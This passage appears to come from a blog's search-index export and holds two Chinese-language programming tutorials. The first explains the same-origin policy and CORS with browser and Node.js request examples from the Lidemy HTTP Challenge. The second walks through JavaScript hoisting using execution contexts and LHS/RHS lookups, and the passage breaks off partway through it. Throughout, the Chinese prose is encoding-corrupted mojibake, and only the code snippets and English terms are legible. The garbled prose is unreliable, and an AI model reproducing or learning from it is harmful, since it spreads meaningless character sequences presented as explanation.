æ‰€ä»¥åœ¨è§£é‡‹ CROS ä¹‹å‰ï¼Œä½ è¦å…ˆäº†è§£ç‚ºä»€éº¼éœ€è¦ CORSï¼Ÿæ²’æœ‰ CORS æœƒæœ‰ä»€éº¼å•é¡Œï¼Ÿ æ²’æœ‰ CORS æœƒæœ‰ä»€éº¼å•é¡Œï¼Ÿæ•…äº‹ä¸€æ¨£è¦å¾ç€è¦½å™¨èªªèµ·ï¼Œé¦–å…ˆæœ‰ä¸€å€‹å«åšã€ŒåŒæºæ”¿ç­–ï¼ˆSame-origin policyï¼‰ã€çš„è¦ç¯„ï¼Œå…§å®¹æ˜¯å¦‚æœã€Œè«‹æ±‚è³‡æ–™æ–¹ã€è·Ÿã€Œæä¾›è³‡æ–™æ–¹ã€å…©è€…ä¸åŒæºï¼Œç€è¦½å™¨å°±æœƒæŠŠ response çµ¦æ“‹ä¸‹ä¾†ï¼Œè‡³æ–¼ä»€éº¼æ˜¯ã€Œä¸åŒæºã€ç­‰ä¸€ä¸‹æœƒåœ¨è§£é‡‹ã€‚ é¦–å…ˆå¤§éƒ¨åˆ†çš„äººåœ¨ç© Lidemy HTTP Challenge çš„æ™‚å€™æ˜¯é€é curl æˆ–æ˜¯åœ¨ Node.js è£¡æ­é… request ä¾†ç©çš„ï¼Œæ‰€ä»¥ä¸æœƒç¢°åˆ°é€™å€‹å•é¡Œã€‚ ä½†æ˜¯å¦‚æœä½ æ”¹ç”¨ã€Œç€è¦½å™¨ã€çš„è©±å°±ä¸ä¸€æ¨£äº†ï¼Œæ‹¿ç¬¬ä¸‰é—œä¾†èˆ‰ä¾‹ï¼š 12345678910111213141516/* å‚™è¨»ï¼šé€™ä¸€é—œè¦æ–°å¢ä¸€æœ¬æ›¸åˆ°åœ–æ›¸ç³»çµ±è£¡*/const xhr = new XMLHttpRequest()// è¦å‚³é€çš„è³‡æ–™const data = new FormData()data.append('name', 'ã€Šå¤§è…¦å–œæ­¡é€™æ¨£å­¸ã€‹')data.append('ISBN', '9789863594475')// request è³‡è¨Šxhr.open('POST', 'https://lidemy-http-challenge.herokuapp.com/api/books')// é€å‡º requestxhr.send(data)// æ‹¿åˆ°å›æ‡‰xhr.onload = function () { console.log(this.responseText)} é€™æ™‚å€™æ‰“é–‹ console æœƒçœ‹åˆ°ï¼š å‚™è¨»ï¼šé€™è£¡æˆ‘æœ‰é–‹ liver-serverï¼Œæ‰€ä»¥ç¶²å€æ‰æœƒæ˜¯ http://127.0.0.1:5500 é€™å€‹å°±å«åšã€Œä¸åŒæºã€ï¼Œå› ç‚ºã€ŒåŸŸåã€ä¸ä¸€æ¨£ï¼š è«‹æ±‚è³‡æ–™è€…ï¼ˆæˆ‘ï¼‰ http://127.0.0.1:5500 çš„åŸŸåæ˜¯ localhostï¼ˆé€™å€‹ ip å°±æ˜¯å°æ‡‰åˆ° localhostï¼‰ è³‡æ–™æä¾›è€…ï¼ˆLidemyï¼‰çš„åŸŸåæ˜¯ lidemy-http-challenge.herokuapp.com ï¼ˆåš´è¬¹ä¸€é»ä¾†èªªçš„è©± http è·Ÿ https ä¹Ÿæ˜¯ä¸åŒæºï¼Œä¸åŒçš„ port ä¹Ÿæ˜¯ä¸åŒæºï¼Œåªæ˜¯æœ€å¸¸è¦‹çš„æ˜¯åŸŸåï¼‰ é€™å…©å€‹æ˜¯ä¸ä¸€æ¨£çš„ï¼Œæ‰€ä»¥é›–ç„¶ request è¢«é€å‡ºå»äº†ï¼Œä½†å›å‚³çµæœè¢«ç€è¦½å™¨çµ¦æ“‹ä¸‹äº†ã€‚ å†ç‰¹åˆ¥å¼·èª¿ä¸€æ¬¡ï¼Œrequest é‚„æ˜¯æœƒé€å‡ºå»ï¼Œåªæ˜¯çµæœæœƒè¢«ç€è¦½å™¨æ“‹ä¸‹ä¾†ã€‚ åˆ‡æ›åˆ° Network çš„æ¬„ä½ï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹è³‡è¨Šï¼š Status Code æ˜¯ 200ï¼Œä»£è¡¨è™•ç†æˆåŠŸã€‚ä¹Ÿå°±æ˜¯èªªä½ å…¶å¯¦æ˜¯æœ‰æ–°å¢æ›¸æœ¬åˆ° server ç«¯ï¼Œåªæ˜¯å›å‚³çµæœè¢«ç€è¦½å™¨æ“‹ä¸‹ä¾†äº†è€Œå·²ã€‚ å‚™è¨»ï¼šå…¶å¯¦åƒ POST é€™ç¨®æœƒå»æ”¹ server ç«¯è³‡æ–™çš„ request é€šå¸¸æœƒç”¨ã€ŒPreflight Requestã€æ¯”è¼ƒåš´è¬¹ï¼ˆè©³ç´°å¯ä»¥åƒè€ƒ è¼•é¬†ç†è§£ Ajax èˆ‡è·¨ä¾†æº request ï¼‰ï¼Œä¸ç„¶å¦‚æœå“ªå¤©æˆ‘éš¨ä¾¿ç™¼ä¸€å€‹ DELETE åˆ° server å°±å¯ä»¥ç›´æ¥æŠŠæ±è¥¿çµ¦åˆªé™¤æ‰ï¼Œä¹Ÿå¤ªä¸å®‰å…¨äº†ï¼Œå°å§ï¼Ÿ å¾é€™è£¡å¯ä»¥çœ‹åˆ°é›™æ–¹çš„ä¾†æºï¼ŒHost æ˜¯ Lidemy çš„ä½ç½®ï¼ŒOrigin æ˜¯æˆ‘çš„ä½ç½®ã€‚ æ‰€ä»¥åªè¦é€™ç¨® Host è·Ÿ Origin æ˜¯ä¾†è‡ªä¸åŒåœ°æ–¹çš„ request ï¼Œç€è¦½å™¨éƒ½æœƒæŠŠ response çµ¦æ“‹ä¸‹ä¾†ã€‚ ç‚ºä»€éº¼éœ€è¦ CORSï¼Ÿæ‰€ä»¥åœ¨ åŒæºæ”¿ç­–ï¼ˆSame-origin policyï¼‰ çš„è¦ç¯„ä¸‹ï¼Œæ ¹æœ¬ä¸å¯èƒ½åšåˆ°ã€Œå»åˆ¥çš„åœ°æ–¹æ‹¿è³‡æ–™ã€é€™ä»¶äº‹ã€‚ CORS å°±æ˜¯ç”¨ä¾†è§£æ±ºé€™å€‹å•é¡Œçš„ã€‚ é‚„è¨˜å¾—å‰é¢å‰›å‰›èªªé CORS çš„ç”¨æ„æ˜¯è®“æˆ‘å€‘ã€Œåˆ°ä¸åŒä¾†æºçš„åœ°æ–¹å»æ‹¿è³‡æ–™ã€é€™ä»¶äº‹å—ï¼Ÿç¾åœ¨ä½ åªè¦åœ¨ server ç«¯åŠ ä¸Šä¸€å€‹ headerï¼šaccess-control-allow-originï¼Œå°±å¯ä»¥åšåˆ°é€™ä»¶äº‹æƒ…ã€‚ access-control-allow-origin æ˜¯ CORS é€™å€‹è¦ç¯„ä¸‹çš„ä¸€å€‹ headerï¼Œç”¨ä¾†è®“ sever æ±ºå®šã€Œèª°å¯ä»¥å­˜å–é€™å€‹è³‡æºã€çš„æ„æ€ã€‚ å¦‚æœæˆ‘åªæƒ³è®“ã€Œhttp://example.com:8080ã€ä¾†å­˜å–è³‡æºï¼Œserver å°±è¨­å®šï¼š access-control-allow-origin: http://example.com:8080 å¦‚æœè¦è®“ã€Œä»»ä½•äººã€éƒ½èƒ½å­˜å–ï¼Œé‚£å°±ç”¨è¬ç”¨å­—å…ƒã€Œ*ã€ä¾†è¨­å®šï¼š access-control-allow-origin: * ä»¥ Twitch çš„ API ä¾†èˆ‰ä¾‹ï¼š å¯ä»¥è·Ÿ Lidemy å°ç…§ä¸€ä¸‹ï¼š å…©å€‹åªå·®åœ¨æœ‰æ²’æœ‰ access-control-allow-origin è€Œå·²ï¼ŒLidemy æ²’æœ‰åŠ ä¸Šé€™å€‹ headerï¼Œæ‰€ä»¥æˆ‘å€‘ç™¼ request çš„æ™‚å€™ response æœƒè¢«ç€è¦½å™¨çµ¦æ“‹ä½ï¼Œä½†æ˜¯ Twitch æœ‰ï¼Œæ‰€ä»¥ç™¼ request çµ¦ Twitch ä¸æœƒè¢«ç€è¦½å™¨çµ¦æ“‹ä¸‹ responseï¼š é›–ç„¶å·²ç¶“èªªéå¾ˆå¤šæ¬¡äº†ï¼Œä½†é‚„æ˜¯è¦å†å¼·èª¿ä¸€æ¬¡ã€‚ä½ ä¸€å®šè¦ææ¸…æ¥šç€è¦½å™¨æ“‹ä¸‹çš„æ˜¯ sever å›å‚³çš„ responseï¼Œä¸æ˜¯ä½ ç™¼å‡ºå»çš„ requestï¼Œé€™å€‹å·®ç•°å¾ˆé‡è¦ã€‚ æœ€å¾Œçµ±æ•´å¹¾å€‹é‡é»ï¼š å› ç‚ºåŒæºæ”¿ç­–çš„é—œä¿‚ï¼Œæ‰€ä»¥æ²’è¾¦æ³•åˆ°åˆ¥çš„åœ°æ–¹æ‹¿è³‡æ–™ åŒæºæ”¿ç­–çš„æ©Ÿåˆ¶æ˜¯ç€è¦½å™¨æœƒæŠŠ response æ“‹ä¸‹ä¾†ï¼Œä½†å¯¦éš›ä¸Š request é‚„æ˜¯æœ‰ç™¼å‡ºå» CORS æ˜¯ç”¨ä¾†è§£æ±ºåŒæºæ”¿ç­–çš„é™åˆ¶ï¼Œå¯¦ç¾ã€Œè·¨ä¾†æºã€äº¤æ›è³‡æ–™é€™ä»¶äº‹ï¼Œå¯¦ç¾çš„æ–¹æ³•å°±æ˜¯åœ¨ server ç«¯åŠ ä¸Š access-control-allow-origin: * å¤§è‡´ä¸Šå°±æ˜¯é€™æ¨£ï¼Œä¸éé‚„æœ‰å¦å¤–ä¸€ç¨®å¯¦ç¾ã€Œè·¨ä¾†æºã€äº¤æ›è³‡æ–™çš„è€æ–¹æ³•ï¼Œå«åšã€ŒJSONPã€ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯è—‰ç”± &lt;script src=\"xxx\"&gt; ä¾†ç™¼å‡º request ï¼Œè©³ç´°å¯ä»¥åƒè€ƒæˆ‘ä»¥å‰å¯«çš„æ–‡ç« ï¼šå¯¦ä½œ JSONPã€‚ é—œæ–¼ç€è¦½å™¨çš„é™åˆ¶ç€è¦½å™¨é™¤äº†æœ‰åŒæºæ”¿ç­–çš„è¦ç¯„ä¹‹å¤–ï¼Œé‚„æœ‰ä¸€å€‹é™åˆ¶æ˜¯ä¸å¯ä»¥ç«„æ”¹ User-Agent çš„å…§å®¹ã€‚ åœ¨éŠæˆ²çš„ç¬¬ä¹é—œï¼Œä¸æ˜¯æœƒè¦ä½ å»æŠŠ User-Agent æ”¹æˆ IE6 çš„å…§å®¹å—ï¼Ÿå¦‚æœç”¨ç€è¦½å™¨ä¾†åšçš„è©±ä¸€æ¨£æœƒç™¼ç¾è¡Œä¸é€šï¼š 123456789101112131415161718/* å‚™è¨»ï¼šé€™ä¸€é—œè¦å–å¾—ã€Œç³»çµ±è³‡è¨Šã€ä¸­çš„è³‡æ–™*/const xhr = new XMLHttpRequest()// è¨­å®šrequestxhr.open('GET', 'https://lidemy-http-challenge.herokuapp.com/api/v2/sys_info')// http basic é©—è­‰xhr.setRequestHeader('Authorization', 'Basic YWRtaW46YWRtaW4xMjM=')// é¡Œç›®è¦æ±‚çš„è‡ªå®šç¾© headerxhr.setRequestHeader('X-Library-Number', '20')// æŠŠ user-agent æ”¹æˆ IE6 çš„è³‡è¨Šxhr.setRequestHeader('user-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)')// é€å‡ºrequestxhr.send()// æ‹¿åˆ°å›å‚³çµæœxhr.onload = function () { console.log(this.responseText)} çµæœå¦‚ä¸‹ï¼š é™¤äº†ä¸åŒæºçš„å•é¡Œä¹‹å¤–ï¼Œç¾åœ¨é‚„è¹¦å‡ºäº†ä¸€å€‹ Refused to set unsafe header \"user-agent\" éŒ¯èª¤ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ã€Œä¸è¦äº‚æ”¹ user-agentï¼Œé€™æ¨£æœƒåˆå››å•¦ã€ã€‚ é€™æ™‚å€™ä½ æª¢æŸ¥ä¸€ä¸‹ request headerï¼Œå°±èƒ½çœ‹åˆ°çœŸçš„æ²’æœ‰è¢«æ”¹æ‰ï¼š ä½†å¦‚æœæ˜¯åœ¨ã€Œä¸æ˜¯ç€è¦½å™¨ã€çš„æƒ…æ³ä¸‹ï¼ˆä¾‹å¦‚ Node.jsï¼‰ï¼Œå°±ä¸æœƒæœ‰é€™å€‹é™åˆ¶ï¼š 123456789101112131415161718192021/* å‚™è¨»ï¼šä¸€æ¨£æ˜¯ç¬¬ä¹é—œçš„å…§å®¹*/const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request( { method: 'GET', url: `${API_ENDPOINT_V2}/sys_info`, headers: { Authorization: 'Basic YWRtaW46YWRtaW4xMjM=', 'X-Library-Number': '20', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)' } }, (err, res, body) =&gt; { // å°å‡ºå›å‚³çš„ç‹€æ…‹ç¢¼ console.log(res.statusCode) // å°å‡º header çš„è³‡è¨Š console.log(res.request.headers) }) çµæœï¼š 123456200{ 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=', 'X-Library-Number': '20', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)'} æ‰€ä»¥çœ‹å®Œé€™ç¯‡æ–‡ç« å¾Œä¸€å®šè¦ææ¸…æ¥š æ˜¯ä¸æ˜¯åœ¨ç€è¦½å™¨åŸ·è¡Œçš„ï¼Ÿ æœƒå½±éŸ¿æœ€å¾Œçš„çµæœã€‚ å¦‚æœæ˜¯ï¼Œé‚£ä½ å°±è¦æ³¨æ„ç€è¦½å™¨æœƒæœ‰å“ªäº›é™åˆ¶ï¼Œåƒå‰›å‰›ä»‹ç´¹çš„ã€ŒåŒæºç­–ç•¥ã€å’Œã€Œä¸å¯ä»¥ç«„æ”¹ User-Agentã€ç­‰ç­‰ã€‚ ä¸æ˜¯çš„è©±å‘¢ï¼Ÿé‚£æ­å–œä½ ï¼Œä»¥ä¸Šæåˆ°çš„é™åˆ¶å…¨éƒ¨éƒ½ä¸æœƒç™¼ç”Ÿã€‚ æ–‡æœ«å…¶å¯¦åœ¨ç©éŠæˆ²çš„æ™‚å€™æ²’æœ‰è€ƒæ…®åˆ°é‚£éº¼å¤šäº‹æƒ…ï¼Œæ˜¯å› ç‚ºçœ‹äº† å¹•å¾ŒèŠ±çµ®ï¼šLidemy HTTP Challenge çš„è¨­è¨ˆä»¥åŠå½©è›‹ å¾Œæ‰ç™¼ç¾é€™äº›è—åœ¨è£¡é ­çš„çœ‰çœ‰è§’è§’ã€‚ æ‰€ä»¥å¦‚æœä½ åŸæœ¬è·Ÿæˆ‘ä¸€æ¨£æ²’æœ‰ç™¼ç¾é€™äº›ç´°ç¯€çš„è©±ï¼Œå¸Œæœ›é€™ç¯‡æ–‡ç« èƒ½å¤ ç‚ºä½ å¸¶ä¾†å¹«åŠ©ã€‚","link":"/2022/01/10/learn-cors-and-browser-limitations-from-game/"},{"title":"å­¸ hoisting ä¹‹å‰å…ˆç†è§£ EC æ˜¯ä»€éº¼ï¼Ÿ","text":"å¾æ­¤ä¸å†æ€• hoistingã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªï¼ŒJavaScript é›–ç„¶è¢«ç¨±ä½œã€Œç›´è­¯å¼èªè¨€ã€ï¼Œä½†ä½ ä¸è¦çœŸçš„æŠŠå®ƒæƒ³æˆæ˜¯ã€Œä¸€è¡Œä¸€è¡ŒåŸ·è¡Œã€ï¼Œå› ç‚ºå¦‚æœçœŸæ˜¯å¦‚æ­¤çš„è©± hoisting çš„è¡Œç‚ºæ˜¯å¾ˆä¸åˆç†çš„ï¼Œä¾‹å¦‚èªªï¼š 12console.log(a) var a = 10 è¼¸å‡ºçµæœæœƒæ˜¯ undefined è€Œä¸æ˜¯ ReferenceError: a is not definedï¼Œé€™å€‹æ˜¯ hoisting çš„è¡Œç‚ºå¤§å®¶éƒ½çŸ¥é“ï¼Œä½†é‡é»æ˜¯å¦‚æœ JS çœŸçš„æ˜¯ä¸€è¡Œä¸€è¡ŒåŸ·è¡Œçš„è©±ã€‚åœ¨åŸ·è¡Œ console.log(a) çš„æ™‚å€™æ€éº¼å¯èƒ½æœƒçŸ¥é“å¾Œé¢æœ‰å®£å‘Š aï¼Ÿ æ‰€ä»¥å…¶å¯¦ JavaScript æ˜¯æœ‰ã€Œç·¨è­¯ã€é€™å€‹å‹•ä½œçš„ã€‚å¾…æœƒè¦è«‡çš„ ECï¼ˆExecution-Contextsï¼‰å°±æ˜¯åœ¨è«‡ç·¨è­¯éšæ®µæ™‚ JavaScript åˆ°åº•éƒ½åšäº†ä»€éº¼ï¼Ÿ é™„è¨»ï¼šé€™é‚Šçš„ç·¨è­¯èªªæ³•å¾ˆæœ‰å¯èƒ½æ˜¯éŒ¯çš„ï¼Œæœƒé€™æ¨£èªªæ˜¯å› ç‚ºæˆ‘èªç‚ºé€™æ¨£å­æ€è€ƒæœƒæ¯”è¼ƒå¥½ç†è§£ï¼Œæ‰€ä»¥ä½ å¦‚æœç™¼ç¾é€™æ˜¯ä¸å°çš„è©±ï¼Œä¸è¦å¤ªèªçœŸï¼Œç¢ºå¯¦å°±æ˜¯æˆ‘å¯«çš„ä¸å°ã€‚ é—œæ–¼ ECå¯ä»¥æŠŠ Execution-Contextsï¼ˆåŸ·è¡Œç’°å¢ƒï¼‰æƒ³æˆæ˜¯ä¸€å€‹ç®±å­ï¼Œè£¡é¢æœ‰å€‹å«åš VOï¼ˆVariable Objectï¼‰çš„æ±è¥¿æœƒå„²å­˜åŸ·è¡Œéšæ®µæ™‚æ‰€éœ€çš„è³‡è¨Šã€‚ æ¯æ¬¡é€²åˆ°ä¸€å€‹ function è£¡å°±æœƒç”¢ç”Ÿä¸€å€‹ ECï¼ŒæŒ‰ç…§é †åºã€Œå †ç–Šï¼ˆStackï¼‰ã€ï¼Œåƒè€ƒé€™å¼µåœ–ï¼š å¯«æˆç¨‹å¼ç¢¼æœƒåƒé€™æ¨£ï¼š 12345678910111213// æœ€å¤–å±¤æœƒå…ˆç”¢ç”Ÿä¸€å€‹ global ECfunction N () { // ç”¢ç”Ÿ N çš„ EC function N_1 () { // ç”¢ç”Ÿ N_1 çš„ EC function N_2 () { // ç”¢ç”Ÿ N_2 çš„ EC function Current () { // ç”¢ç”Ÿ Current çš„ EC } } }} æ¯å€‹ EC è£¡é¢éƒ½æœƒæœ‰è‡ªå·±çš„ VOï¼Œé‚£ VO å¯¦éš›ä¸Šåˆ°åº•è£ä»€éº¼ï¼Ÿç›´æ¥ä¾†çœ‹ä¾‹å­ï¼š 1234567function test(a, b) { console.log(a) // 10 console.log(b) // undefined console.log(c) // undefined var c = 10}test(10) åœ¨ test ä¸­çš„ VO å°±é•·é€™æ¨£ï¼š 1234567test EC: { VO: { a: 10, b: undefined, c: undefined }} æ‰€ä»¥åœ¨åŸ·è¡Œ test çš„æ™‚å€™ï¼Œç¢°åˆ° console.log() æ™‚å°±æœƒåˆ° VO è£¡é¢å»æ‰¾è³‡æºï¼Œæ›å¥è©±èªªï¼ŒVO è£¡é¢æ²’æœ‰çš„æ±è¥¿ï¼Œä½ å°±å­˜å–ä¸åˆ°ï¼ˆåš´è¬¹ä¸€é»ä¾†èªªæ˜¯æŒ‰ç…§ scope chain å¾€ä¸Šæ‰¾ï¼Œç›´åˆ°æ‰¾ä¸åˆ°ç‚ºæ­¢ï¼‰ã€‚é—œæ–¼ scope chain çš„æ©Ÿåˆ¶ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ï¼šå¾ ECMAScript ä¾†ç†è§£é–‰åŒ…èˆ‡ä½œç”¨åŸŸçš„åŸç† é‚£æ±è¥¿æ˜¯æ€éº¼æ”¾åˆ° VO è£¡é¢çš„ï¼Ÿè¨˜ä½é€™äº›åŸå‰‡ï¼š function å„ªå…ˆ æ¥è‘—æ˜¯ function çš„åƒæ•¸ï¼Œå¦‚æœåƒæ•¸æœ‰å€¼çš„è©±å°±å„²å­˜ï¼Œæ²’æœ‰çš„è©±å°±è¨­ç‚º undefined æœ€å¾Œæ˜¯ variableï¼Œä¸€å¾‹è¨­ç‚º undefined å¦å¤–å°±æ˜¯é‡è¤‡å‡ºç¾çš„æ™‚å€™è©²æ€éº¼è¾¦ï¼Ÿæˆ‘å€‘ä¸€å€‹ä¸€å€‹ä¾†çœ‹ï¼š variable æœƒè¢«å¿½ç•¥ 123456function test(a, b) { console.log(a) // 10 var a = 100 console.log(a) // 100}test(10, 5) 123456test EC: { VO: { a: 10, b: 5 }} åœ¨ç¬¬ä¸€å€‹ console.log(a) çš„æ™‚å€™ï¼ŒVO ä¸­çš„ a=10ï¼Œæ‰€ä»¥å°å‡º 10ã€‚åˆ°äº†ç¬¬äºŒå€‹ console.log(a) çš„æ™‚å€™ï¼Œa å› ç‚ºåœ¨ä¸Šä¸€è¡Œè¢«é‡æ–°è³¦å€¼ï¼Œæ‰€ä»¥ a=100 æœ€å¾Œå°å‡º 100ã€‚ é€™é‚Šè¦å¼·èª¿çš„æ˜¯ Variable åœ¨ VO åˆå§‹åŒ–æ™‚ï¼Œä¸æœƒæŠŠåŸæœ¬çš„ a:10 è¦†å¯«æˆ a:undefined è€Œæ˜¯è¢«å¿½ç•¥ã€‚ function æœƒç›´æ¥è¦†å¯« 12345678function test(a, b) { console.log(a) // [Function: a] function a() { console.log('æˆ‘æœ€å„ªå…ˆ') } console.log(a) // [Function: a]}test(10, 5) åœ¨ç¢°åˆ° functino å‰çš„ VO æ˜¯é•·é€™æ¨£ï¼š 123456test EC: { VO: { a: 10, b: 5 }} ä½†ç¢°åˆ° function å¾Œæœƒè®Šé€™æ¨£ï¼š 123456test EC: { VO: { a: Function, b: 5 }} é€™è£¡çš„ Function æƒ³æˆæ˜¯æŒ‡æ¨™å°±å¥½ï¼Œå¯¦éš›å„²å­˜çš„æ˜¯è¨˜æ†¶é«”ä½ç½®ã€‚ æ‰€ä»¥ä½ åªè¦çŸ¥é“ç·¨è­¯å®Œå¾Œçš„ VO é•·ä»€éº¼æ¨£å­ï¼Œå°±çµ•å°ä¸æœƒæéŒ¯ hoisting çš„è¡Œç‚ºæ˜¯ä»€éº¼ã€‚ æœ€å¾Œä¸€å¡Šæ‹¼åœ– LHS è³¦å€¼ &amp; RHS æŸ¥è©¢å€¼å‰›å‰›è¬›çš„æ˜¯ç·¨è­¯éšæ®µï¼Œç¾åœ¨ä¾†è¬›ã€ŒåŸ·è¡Œéšæ®µã€ã€‚ åŸ·è¡Œéšæ®µä¸­æœ‰å…©å€‹è¡“èªï¼Œåˆ†åˆ¥æ˜¯ï¼š LHSï¼ˆLeft hand sideï¼‰å¼•ç”¨ RHSï¼ˆRight hand sideï¼‰å¼•ç”¨ ç°¡å–®ä¾†èªª LHS å°±æ˜¯ã€Œè«‹å¹«æˆ‘å»æ‰¾é€™å€‹è®Šæ•¸çš„ä½ç½®åœ¨å“ªè£¡ï¼Œå› ç‚ºæˆ‘è¦å°å®ƒè³¦å€¼ï¼ŒRHS å‰‡æ˜¯ã€Œè«‹å¹«æˆ‘å»æ‰¾å‡ºé€™å€‹è®Šæ•¸çš„å€¼ï¼Œå› ç‚ºæˆ‘è¦ç”¨é€™å€‹å€¼ã€‚ 12var a = 10console.log(a) Line1 var a = 10 JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šscope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° a ä¸¦ä¸”è³¦å€¼ Line2 console.log(a) JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šscope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸè¿”å› a çš„å€¼ ä¸å†ç•æ‡¼ hoistingä½ åªè¦æŒæ¡äº†ã€Œç·¨è­¯éšæ®µã€æ˜¯æ€éº¼åˆå§‹åŒ–çš„ï¼Ÿé‚„æœ‰ã€ŒåŸ·è¡Œéšæ®µã€æ˜¯æ€éº¼åŸ·è¡Œçš„ï¼Ÿæˆ‘ç›¸ä¿¡ä»»ä½•è·Ÿ hoisting æœ‰é—œçš„å•é¡Œéƒ½ä¸å†æ˜¯å•é¡Œï¼Œæœ€å¾Œè®“æˆ‘å€‘ä¾†å¾é ­åˆ°å°¾æ¼”ç·´ä¸€æ¬¡çœ‹çœ‹ï¼š 1234567891011121314151617181920var a = 1;function test(){ console.log('1.', a); var a = 7; console.log('2.', a); a++; var a; inner(); console.log('4.', a); function inner(){ console.log('3.', a); a = 30; b = 200; }}test();console.log('5.', a);a = 70;console.log('6.', a);console.log('7.', b); æˆ‘å€‘å…ˆå¾ VO é–‹å§‹ï¼š 1234567891011121314151617181920// globalglobal EC{ VO: { a: undefined, test: Function, }}// testtest EC { VO: { a: undefined, inner: Function, }}// inner æ²’æœ‰åšä»»ä½•å®£å‘Šï¼Œæ‰€ä»¥æ˜¯ç©ºçš„ inner EC { VO: {}} æ¥è‘—ä¾†ä¸€è¡Œä¸€è¡ŒåŸ·è¡Œï¼š Line1 var a = 1 JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° a ä¸¦ä¸”è³¦å€¼ï¼ˆa=1ï¼‰ Line16 test() JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° test() çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° test() ä¸¦åŸ·è¡Œ function Line3 console.log(â€˜1.â€™, a) JS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼štest scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ°è¿”å› a çš„å€¼ï¼ˆundefinedï¼‰ Line4 var a = 7 JS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼štest scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° a ä¸¦ä¸”è³¦å€¼ï¼ˆa=7ï¼‰ Line5 console.log(â€˜2.â€™, a) JS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼štest scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ°è¿”å› a çš„å€¼ï¼ˆ7ï¼‰ Line6 a++ï¼ˆa = a + 1ï¼‰ JS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å’Œ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼štest scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ°è¿”å› a çš„å€¼ï¼ˆ7ï¼‰ï¼Œä¸¦ä¸”è³¦å€¼ï¼ˆ7 + 1 = 8ï¼‰ Line7 var a é€™ä¸€è¡Œæ²’æœ‰åšä»»ä½•äº‹ï¼Œæ‰€ä»¥ä¸åšä»»ä½•å‹•ä½œã€‚ Line8 inner() JS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° inner() çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼štest scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° inner() ä¸¦åŸ·è¡Œ function Line11 console.log(â€˜3.â€™, a) JS å¼•æ“ï¼šinner scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šinner scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥å»å•ä¸Šä¸€å±¤çš„ test scopeJS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼štest scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ°è¿”å› a çš„å€¼ï¼ˆ8ï¼‰ Line12 a = 30 JS å¼•æ“ï¼šinner scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šinner scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥å»å•ä¸Šä¸€å±¤çš„ test scopeJS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼štest scope 